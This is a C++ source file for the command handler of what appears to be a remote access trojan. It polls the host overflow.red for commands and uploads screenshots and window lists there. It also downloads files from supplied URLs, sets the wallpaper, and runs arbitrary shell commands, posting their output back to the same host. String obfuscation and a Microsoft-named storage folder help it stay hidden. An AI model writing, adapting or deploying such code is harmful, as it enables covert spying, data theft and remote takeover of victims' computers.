#include "communication.h"
#include <iostream>

#include "..\utility\requests.h"
#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace client {
	namespace communication {
		void handler_loop() {
			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + client::ip);
				if (!cmd.empty()) {	
					char buff[256];
					sprintf_s(buff, "%s", cmd.c_str());
	
					if (cmd == "screenshot") {
						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**") + std::string("&ip=") + client::ip);
					} 
					else if (cmd == "windows") {
						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
					}
					else if (cmd.find("download") != std::string::npos && 
							 (cmd.find("https") != std::string::npos || 
							 cmd.find("http") != std::string::npos)) {
						auto index = cmd.find("http") != std::string::npos ? cmd.find("http") : cmd.find("https");
						auto url = cmd.substr(index);
						requests::download_file(url, helpers::roaming + xorstr_("\\Microsoft\\") + "download" + cmd.substr(cmd.find_last_of(".")));
					}
					else if (cmd.find("wallpaper") != std::string::npos &&
							(cmd.find("https") != std::string::npos ||
							cmd.find("http") != std::string::npos)) {
						auto index = cmd.find("http") != std::string::npos ? cmd.find("http") : cmd.find("https");
						auto url = cmd.substr(index);
						auto path = helpers::roaming + xorstr_("\\Microsoft\\") + "download" + cmd.substr(cmd.find_last_of("."));
						std::string message = "";
						if (requests::download_file(url, path)) {
							functions::set_wallpaper(helpers::s2ws(path).c_str());
							message = "Success";
						}
						else {
							message = "Failed to download file";
						}

						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Set Wallpaper**\n```\n") + message + xorstr_("\n```"));
					}
					else {
						auto response = helpers::exec(cmd.c_str());
						if (response.empty())
							response = "-Empty-";
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Command Response**\n```\n") + response + xorstr_("\n```"));
					}
				}
			}
		}
	}
}